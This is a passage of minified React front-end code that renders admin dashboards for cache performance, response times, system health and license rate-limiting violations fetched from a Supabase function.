ANALYSIS"]})}),a.jsx(X,{className:"relative z-10",children:a.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4",children:[a.jsxs("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:[a.jsxs("div",{className:"flex items-center justify-between mb-2",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"PATTERN CACHE"}),a.jsxs("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${d(t.cache_hit_rates.pattern_cache,80,90)} border backdrop-blur-sm`,children:[t.cache_hit_rates.pattern_cache.toFixed(1),"%"]})]}),a.jsx("div",{className:"w-full bg-slate-600/50 rounded-full h-2",children:a.jsx("div",{className:"bg-gradient-to-r from-cyan-400 to-blue-500 h-2 rounded-full transition-all duration-500",style:{width:`${t.cache_hit_rates.pattern_cache}%`}})})]}),a.jsxs("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:[a.jsxs("div",{className:"flex items-center justify-between mb-2",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"KEY CACHE"}),a.jsxs("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${d(t.cache_hit_rates.key_cache,80,90)} border backdrop-blur-sm`,children:[t.cache_hit_rates.key_cache.toFixed(1),"%"]})]}),a.jsx("div",{className:"w-full bg-slate-600/50 rounded-full h-2",children:a.jsx("div",{className:"bg-gradient-to-r from-emerald-400 to-cyan-500 h-2 rounded-full transition-all duration-500",style:{width:`${t.cache_hit_rates.key_cache}%`}})})]}),a.jsxs("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:[a.jsxs("div",{className:"flex items-center justify-between mb-2",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"ANALYTICS CACHE"}),a.jsxs("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${d(t.cache_hit_rates.analytics_cache,80,90)} border backdrop-blur-sm`,children:[t.cache_hit_rates.analytics_cache.toFixed(1),"%"]})]}),a.jsx("div",{className:"w-full bg-slate-600/50 rounded-full h-2",children:a.jsx("div",{className:"bg-gradient-to-r from-purple-400 to-blue-500 h-2 rounded-full transition-all duration-500",style:{width:`${t.cache_hit_rates.analytics_cache}%`}})})]}),a.jsxs("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:[a.jsxs("div",{className:"flex items-center justify-between mb-2",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"OVERALL"}),a.jsxs("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${d(t.cache_hit_rates.overall,80,90)} border backdrop-blur-sm`,children:[t.cache_hit_rates.overall.toFixed(1),"%"]})]}),a.jsx("div",{className:"w-full bg-slate-600/50 rounded-full h-2",children:a.jsx("div",{className:"bg-gradient-to-r from-yellow-400 to-orange-500 h-2 rounded-full transition-all duration-500",style:{width:`${t.cache_hit_rates.overall}%`}})})]})]})})]}),a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs(me,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-lg flex items-center gap-2",children:[a.jsx(cr,{className:"w-5 h-5 text-cyan-300"}),"RESPONSE TIME ANALYSIS"]})}),a.jsx(X,{className:"relative z-10",children:a.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4",children:[a.jsx("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:a.jsxs("div",{className:"text-center",children:[a.jsxs("div",{className:"text-2xl font-jetbrains font-bold text-cyan-200 mb-1",children:[t.response_times.url_generation_avg.toFixed(0),"ms"]}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider mb-2",children:"URL GENERATION"}),a.jsx("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${u(t.response_times.url_generation_avg)} border backdrop-blur-sm`,children:t.response_times.url_generation_avg<=50?"EXCELLENT":t.response_times.url_generation_avg<=100?"GOOD":"SLOW"})]})}),a.jsx("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:a.jsxs("div",{className:"text-center",children:[a.jsxs("div",{className:"text-2xl font-jetbrains font-bold text-cyan-200 mb-1",children:[t.response_times.pattern_analysis_avg.toFixed(0),"ms"]}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider mb-2",children:"PATTERN ANALYSIS"}),a.jsx("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${u(t.response_times.pattern_analysis_avg)} border backdrop-blur-sm`,children:t.response_times.pattern_analysis_avg<=50?"EXCELLENT":t.response_times.pattern_analysis_avg<=100?"GOOD":"SLOW"})]})}),a.jsx("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:a.jsxs("div",{className:"text-center",children:[a.jsxs("div",{className:"text-2xl font-jetbrains font-bold text-cyan-200 mb-1",children:[t.response_times.database_query_avg.toFixed(0),"ms"]}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider mb-2",children:"DATABASE QUERY"}),a.jsx("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${u(t.response_times.database_query_avg)} border backdrop-blur-sm`,children:t.response_times.database_query_avg<=50?"EXCELLENT":t.response_times.database_query_avg<=100?"GOOD":"SLOW"})]})}),a.jsx("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:a.jsxs("div",{className:"text-center",children:[a.jsxs("div",{className:"text-2xl font-jetbrains font-bold text-cyan-200 mb-1",children:[t.response_times.cache_lookup_avg.toFixed(1),"ms"]}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider mb-2",children:"CACHE LOOKUP"}),a.jsx("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${u(t.response_times.cache_lookup_avg)} border backdrop-blur-sm`,children:"LIGHTNING"})]})})]})})]}),a.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-6",children:[a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs(me,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-lg flex items-center gap-2",children:[a.jsx(Nn,{className:"w-5 h-5 text-cyan-300"}),"SYSTEM HEALTH"]})}),a.jsxs(X,{className:"relative z-10 space-y-4",children:[a.jsxs("div",{className:"flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"Memory Usage"}),a.jsxs("span",{className:"text-cyan-300 font-jetbrains font-bold",children:[t.system_health.memory_usage_mb.toFixed(0)," MB"]})]}),a.jsxs("div",{className:"flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"Active Connections"}),a.jsx("span",{className:"text-cyan-300 font-jetbrains font-bold",children:t.system_health.active_connections})]}),a.jsxs("div",{className:"flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"DB Performance"}),a.jsx("span",{className:"px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider bg-emerald-500/20 text-emerald-300 border border-emerald-400/30 backdrop-blur-sm",children:t.system_health.database_performance})]}),a.jsxs("div",{className:"flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"Cache Efficiency"}),a.jsx("span",{className:"px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider bg-emerald-500/20 text-emerald-300 border border-emerald-400/30 backdrop-blur-sm",children:t.system_health.cache_efficiency})]})]})]}),a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs(me,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-lg flex items-center gap-2",children:[a.jsx(Sn,{className:"w-5 h-5 text-cyan-300"}),"OPTIMIZATION IMPACT"]})}),a.jsxs(X,{className:"relative z-10 space-y-4",children:[a.jsxs("div",{className:"flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"Cache Saves"}),a.jsx("span",{className:"text-cyan-300 font-jetbrains font-bold",children:t.optimization_stats.cache_saves_count.toLocaleString()})]}),a.jsxs("div",{className:"flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"Performance Boost"}),a.jsxs("span",{className:"text-emerald-300 font-jetbrains font-bold",children:["+",t.optimization_stats.performance_improvement.toFixed(1),"%"]})]}),a.jsxs("div",{className:"flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"CPU Reduction"}),a.jsxs("span",{className:"text-emerald-300 font-jetbrains font-bold",children:["-",t.optimization_stats.cpu_utilization_reduction.toFixed(1),"%"]})]}),a.jsxs("div",{className:"flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"Total Operations"}),a.jsx("span",{className:"text-cyan-300 font-jetbrains font-bold",children:t.optimization_stats.total_operations.toLocaleString()})]})]})]})]})]}):a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-gray-900/50 to-slate-900/60 border border-gray-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-gray-400/3 via-slate-500/3 to-gray-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-gray-400/30 to-transparent"}),a.jsxs(X,{className:"relative z-10 p-8",children:[a.jsxs("div",{className:"flex items-center justify-center gap-3 mb-4",children:[a.jsx(wa,{className:"w-6 h-6 text-gray-300"}),a.jsx("span",{className:"text-gray-200 font-jetbrains font-bold uppercase tracking-wider",children:"NO DATA AVAILABLE"})]}),a.jsx("div",{className:"text-center text-gray-300/80 font-jetbrains text-sm mb-4",children:"DATABASE CONTAINS NO PERFORMANCE METRICS"}),a.jsx("div",{className:"flex justify-center",children:a.jsxs(W,{onClick:()=>c(),size:"sm",className:"bg-gray-700/80 border-gray-400/40 text-gray-200 hover:bg-gray-600/80 hover:border-gray-300/60 font-jetbrains font-bold uppercase tracking-wider",children:[a.jsx(Rt,{className:"w-4 h-4 mr-2"}),"CHECK AGAIN"]})})]})]})},hC=()=>{const[t,e]=p.useState(null),[r,n]=p.useState(!0),[s,i]=p.useState(null),[o,l]=p.useState(new Date);p.useEffect(()=>{c();const f=setInterval(c,6e4);return()=>clearInterval(f)},[]);const c=async()=>{var f,m,g,v,w,y,x,b,j,_,N,S,k,C;try{n(!0),i(null),console.log("[RateLimitingDashboard] Fetching real rate limiting metrics from Supabase functions...");const{data:T,error:M}=await $.rpc("get_rate_limiting_metrics");if(M){console.error("[RateLimitingDashboard] RPC Error:",M),i(`Database connection failed: ${M.message}`),e(null);return}if(console.log("[RateLimitingDashboard] Function result:",T),!T||Object.keys(T).length===0){console.log("[RateLimitingDashboard] No data available in database"),e(null),i(null),l(new Date);return}const A=T,R={system_overview:{total_licenses:((f=A==null?void 0:A.system_overview)==null?void 0:f.total_licenses)??null,active_violations:((m=A==null?void 0:A.system_overview)==null?void 0:m.active_violations)??null,total_requests_today:((g=A==null?void 0:A.system_overview)==null?void 0:g.total_requests_today)??null,avg_requests_per_license:((v=A==null?void 0:A.system_overview)==null?void 0:v.avg_requests_per_license)??null},violation_alerts:{critical_violations:((w=A==null?void 0:A.violation_alerts)==null?void 0:w.critical_violations)??null,warning_violations:((y=A==null?void 0:A.violation_alerts)==null?void 0:y.warning_violations)??null,recent_violations:((x=A==null?void 0:A.violation_alerts)==null?void 0:x.recent_violations)||[]},license_usage:{high_usage_licenses:((b=A==null?void 0:A.license_usage)==null?void 0:b.high_usage_licenses)||[],approaching_limits:((j=A==null?void 0:A.license_usage)==null?void 0:j.approaching_limits)||[],healthy_licenses:((_=A==null?void 0:A.license_usage)==null?void 0:_.healthy_licenses)??null},rate_limit_health:{system_capacity:((N=A==null?void 0:A.rate_limit_health)==null?void 0:N.system_capacity)??null,peak_usage_hour:((S=A==null?void 0:A.rate_limit_health)==null?void 0:S.peak_usage_hour)||null,efficiency_score:((k=A==null?void 0:A.rate_limit_health)==null?void 0:k.efficiency_score)??null,recommendation:((C=A==null?void 0:A.rate_limit_health)==null?void 0:C.recommendation)||null}};console.log("[RateLimitingDashboard] Processed real metrics:",R),e(R),i(null),l(new Date)}catch(T){console.error("[RateLimitingDashboard] Error fetching real metrics:",T),i(`Failed to fetch rate limiting data: ${T instanceof Error?T.message:"Unknown error"}`),e(null)}finally{n(!1)}},d=f=>{switch(f){case"critical":return"bg-red-500/20 text-red-300 border-red-400/30";case"warning":return"bg-yellow-500/20 text-yellow-300 border-yellow-400/30";default:return"bg-gray-500/20 text-gray-300 border-gray-400/30"}},u=f=>f>=90?"bg-red-500/20 text-red-300 border-red-400/30":f>=75?"bg-yellow-500/20 text-yellow-300 border-yellow-400/30":f>=50?"bg-blue-500/20 text-blue-300 border-blue-400/30":"bg-emerald-500/20 text-emerald-300 border-emerald-400/30",h=f=>f>=90?"from-red-400 to-red-600":f>=75?"from-yellow-400 to-orange-500":f>=50?"from-blue-400 to-cyan-500":"from-emerald-400 to-green-500";return r?a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(X,{className:"relative z-10 p-8",children:a.jsxs("div",{className:"flex items-center justify-center gap-3",children:[a.jsx(lt,{className:"w-6 h-6 text-cyan-300 animate-pulse"}),a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider",children:"INITIALIZING RATE LIMIT MONITORING..."})]})})]}):s?a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-red-900/50 to-orange-900/60 border border-red-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-red-400/3 via-orange-500/3 to-red-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-red-400/30 to-transparent"}),a.jsxs(X,{className:"relative z-10 p-8",children:[a.jsxs("div",{className:"flex items-center justify-center gap-3 mb-4",children:[a.jsx(ct,{className:"w-6 h-6 text-red-300"}),a.jsx("span",{className:"text-red-200 font-jetbrains font-bold uppercase tracking-wider",children:"DATABASE CONNECTION FAILED"})]}),a.jsx("div",{className:"text-center text-red-300/80 font-jetbrains text-sm",children:s}),a.jsx("div",{className:"flex justify-center mt-4",children:a.jsxs(W,{onClick:()=>c(),size:"sm",className:"bg-red-700/80 border-red-400/40 text-red-200 hover:bg-red-600/80 hover:border-red-300/60 font-jetbrains font-bold uppercase tracking-wider",children:[a.jsx(Rt,{className:"w-4 h-4 mr-2"}),"RETRY"]})})]})]}):t?a.jsxs("div",{className:"space-y-6",children:[a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsxs("div",{children:[a.jsxs(me,{className:"bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains font-bold text-xl uppercase tracking-wider flex items-center gap-2",children:[a.jsx(lt,{className:"w-6 h-6 text-cyan-300"}),"RATE LIMITING CONTROL CENTER"]}),a.jsx(bt,{className:"text-cyan-300/80 font-jetbrains tracking-wide",children:"VIOLATION MONITORING  USAGE ANALYTICS  SYSTEM PROTECTION"})]}),a.jsxs("div",{className:"flex items-center gap-4",children:[a.jsxs("span",{className:"text-xs text-cyan-300/60 font-jetbrains",children:["Updated: ",o.toLocaleTimeString()]}),a.jsxs("div",{className:"relative group",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-cyan-500 to-blue-500 rounded-lg opacity-60 blur group-hover:opacity-100 transition duration-300"}),a.jsxs(W,{onClick:()=>c(),disabled:r,size:"sm",className:"relative z-10 bg-slate-700/80 border-cyan-400/40 text-cyan-200 hover:bg-slate-600/80 hover:border-cyan-300/60 font-jetbrains font-bold uppercase tracking-wider backdrop-blur-sm",children:[a.jsx(Rt,{className:`w-4 h-4 mr-2 ${r?"animate-spin":""}`}),"REFRESH"]})]})]})]})})]}),a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs(me,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-lg flex items-center gap-2",children:[a.jsx(Vj,{className:"w-5 h-5 text-cyan-300"}),"SYSTEM OVERVIEW"]})}),a.jsx(X,{className:"relative z-10",children:a.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4",children:[a.jsx("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:a.jsxs("div",{className:"text-center",children:[a.jsx("div",{className:"text-2xl font-jetbrains font-bold text-cyan-200 mb-1",children:t.system_overview.total_licenses}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider mb-2",children:"ACTIVE LICENSES"}),a.jsx("span",{className:"px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider bg-blue-500/20 text-blue-300 border border-blue-400/30 backdrop-blur-sm",children:"MONITORED"})]})}),a.jsx("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:a.jsxs("div",{className:"text-center",children:[a.jsx("div",{className:"text-2xl font-jetbrains font-bold text-cyan-200 mb-1",children:t.system_overview.active_violations}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider mb-2",children:"ACTIVE VIOLATIONS"}),a.jsx("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${t.system_overview.active_violations>0?"bg-red-500/20 text-red-300 border-red-400/30":"bg-emerald-500/20 text-emerald-300 border-emerald-400/30"} border backdrop-blur-sm`,children:t.system_overview.active_violations>0?"ALERT":"CLEAN"})]})}),a.jsx("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:a.jsxs("div",{className:"text-center",children:[a.jsx("div",{className:"text-2xl font-jetbrains font-bold text-cyan-200 mb-1",children:t.system_overview.total_requests_today.toLocaleString()}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider mb-2",children:"REQUESTS TODAY"}),a.jsx("span",{className:"px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider bg-purple-500/20 text-purple-300 border border-purple-400/30 backdrop-blur-sm",children:"TRACKING"})]})}),a.jsx("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:a.jsxs("div",{className:"text-center",children:[a.jsx("div",{className:"text-2xl font-jetbrains font-bold text-cyan-200 mb-1",children:t.system_overview.avg_requests_per_license}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider mb-2",children:"AVG PER LICENSE"}),a.jsx("span",{className:"px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider bg-cyan-500/20 text-cyan-300 border border-cyan-400/30 backdrop-blur-sm",children:"OPTIMAL"})]})})]})})]}),a.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-6",children:[a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs(me,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-lg flex items-center gap-2",children:[a.jsx(ct,{className:"w-5 h-5 text-cyan-300"}),"VIOLATION ALERTS"]})}),a.jsxs(X,{className:"relative z-10 space-y-4",children:[a.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[a.jsx("div",{className:"p-3 bg-slate-700/30 rounded-lg border border-red-400/20",children:a.jsxs("div",{className:"text-center",children:[a.jsx("div",{className:"text-lg font-jetbrains font-bold text-red-300 mb-1",children:t.violation_alerts.critical_violations}),a.jsx("div",{className:"text-xs text-red-300/80 font-jetbrains uppercase tracking-wider",children:"CRITICAL"})]})}),a.jsx("div",{className:"p-3 bg-slate-700/30 rounded-lg border border-yellow-400/20",children:a.jsxs("div",{className:"text-center",children:[a.jsx("div",{className:"text-lg font-jetbrains font-bold text-yellow-300 mb-1",children:t.violation_alerts.warning_violations}),a.jsx("div",{className:"text-xs text-yellow-300/80 font-jetbrains uppercase tracking-wider",children:"WARNING"})]})})]}),a.jsx("div",{className:"space-y-2 max-h-48 overflow-y-auto",children:t.violation_alerts.recent_violations.length>0?t.violation_alerts.recent_violations.map((f,m)=>a.jsxs("div",{className:"p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsxs("div",{className:"flex items-center justify-between mb-2",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm",children:f.license_key}),a.jsx("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${d(f.severity)} border backdrop-blur-sm`,children:f.severity})]}),a.jsxs("div",{className:"text-xs text-cyan-300/80 font-jetbrains space-y-1",children:[a.jsxs("div",{children:["Operation: ",f.operation]}),a.jsxs("div",{children:["Attempts: ",f.attempts]}),a.jsxs("div",{children:["Time: ",new Date(f.violation_time).toLocaleTimeString()]})]})]},m)):a.jsx("div",{className:"p-4 text-center text-cyan-300/60 font-jetbrains",children:"NO RECENT VIOLATIONS"})})]})]}),a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs(me,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-lg flex items-center gap-2",children:[a.jsx(Nn,{className:"w-5 h-5 text-cyan-300"}),"RATE LIMIT HEALTH"]})}),a.jsxs(X,{className:"relative z-10 space-y-4",children:[a.jsxs("div",{className:"flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"System Capacity"}),a.jsxs("div",{className:"flex items-center gap-2",children:[a.jsx("div",{className:"w-16 bg-slate-600/50 rounded-full h-2",children:a.jsx("div",{className:"bg-gradient-to-r from-emerald-400 to-green-500 h-2 rounded-full transition-all duration-500",style:{width:`${t.rate_limit_health.system_capacity}%`}})}),a.jsxs("span",{className:"text-cyan-300 font-jetbrains font-bold text-sm",children:[t.rate_limit_health.system_capacity.toFixed(0),"%"]})]})]}),a.jsxs("div",{className:"flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"Peak Usage"}),a.jsx("span",{className:"text-cyan-300 font-jetbrains font-bold",children:t.rate_limit_health.peak_usage_hour})]}),a.jsxs("div",{className:"flex items-center justify-between p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider",children:"Efficiency Score"}),a.jsxs("span",{className:"text-emerald-300 font-jetbrains font-bold",children:[t.rate_limit_health.efficiency_score.toFixed(1),"%"]})]}),a.jsxs("div",{className:"p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsx("div",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider mb-2",children:"Recommendation"}),a.jsx("div",{className:"text-cyan-300/80 font-jetbrains text-sm",children:t.rate_limit_health.recommendation})]})]})]})]}),a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs(me,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-lg flex items-center gap-2",children:[a.jsx(ja,{className:"w-5 h-5 text-cyan-300"}),"LICENSE USAGE ANALYSIS"]})}),a.jsxs(X,{className:"relative z-10",children:[a.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-6",children:[a.jsxs("div",{children:[a.jsxs("h4",{className:"text-cyan-200 font-jetbrains font-bold text-sm uppercase tracking-wider mb-3",children:["HIGH USAGE LICENSES (",t.license_usage.high_usage_licenses.length,")"]}),a.jsx("div",{className:"space-y-2 max-h-48 overflow-y-auto",children:t.license_usage.high_usage_licenses.length>0?t.license_usage.high_usage_licenses.map((f,m)=>a.jsxs("div",{className:"p-3 bg-slate-700/30 rounded-lg border border-cyan-400/20",children:[a.jsxs("div",{className:"flex items-center justify-between mb-2",children:[a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm",children:f.license_key}),a.jsxs("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${u(f.usage_percentage)} border backdrop-blur-sm`,children:[f.usage_percentage.toFixed(1),"%"]})]}),a.jsx("div",{className:"mb-2",children:a.jsx("div",{className:"w-full bg-slate-600/50 rounded-full h-2",children:a.jsx("div",{className:`bg-gradient-to-r ${h(f.usage_percentage)} h-2 rounded-full transition-all duration-500`,style:{width:`${f.usage_percentage}%`}})})}),a.jsxs("div",{className:"text-xs text-cyan-300/80 font-jetbrains",children:[f.current_usage," / ",f.limit," (",f.operation_type,")"]})]},m)):a.jsx("div",{className:"p-4 text-center text-cyan-300/60 font-jetbrains text-sm",children:"NO HIGH USAGE 